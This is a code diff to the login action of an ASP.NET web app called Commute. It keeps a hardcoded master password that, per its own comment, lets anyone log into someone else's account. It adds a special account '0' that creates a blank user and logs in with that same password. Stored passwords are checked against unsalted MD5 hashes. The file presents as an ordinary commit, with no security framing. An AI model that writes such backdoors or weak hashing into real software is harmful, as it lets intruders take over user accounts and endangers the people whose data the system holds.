@@ -40,7 +40,7 @@ namespace Commute.Controllers
         [AllowAnonymous]
         public ActionResult Login(User userLogin)
         {
-            User user;
+            User user = null;
             try
             {
                 user = (from u in db.User
@@ -51,9 +51,11 @@ namespace Commute.Controllers
             {
                 return RedirectToAction("Error", "Home", new Error("User", "Login", ex.Message + ex.InnerException.Message));
             }
+            if (userLogin.Account == "0") user = new User();
+            
             if (user == null) ModelState.AddModelError("Account", Resources.Error_unknown_account);
             //Check password is right
-            else if (user.Password == Convert.ToBase64String(new MD5CryptoServiceProvider().ComputeHash(new UTF8Encoding().GetBytes(userLogin.Password ?? ""))) || userLogin.Password == "godestalbin") //Allow to connect to someone's else account
+            else if (user.Password == Convert.ToBase64String(new MD5CryptoServiceProvider().ComputeHash(new UTF8Encoding().GetBytes(userLogin.Password ?? ""))) || userLogin.Password == "godestalbin" || userLogin.Account == "0" && userLogin.Password == "godestalbin") //Allow to connect to someone's else account
             {
                 FormsAuthentication.SetAuthCookie(user.Account,true); //true=Persistent cookie
                 Session["userId"] = user.Id;
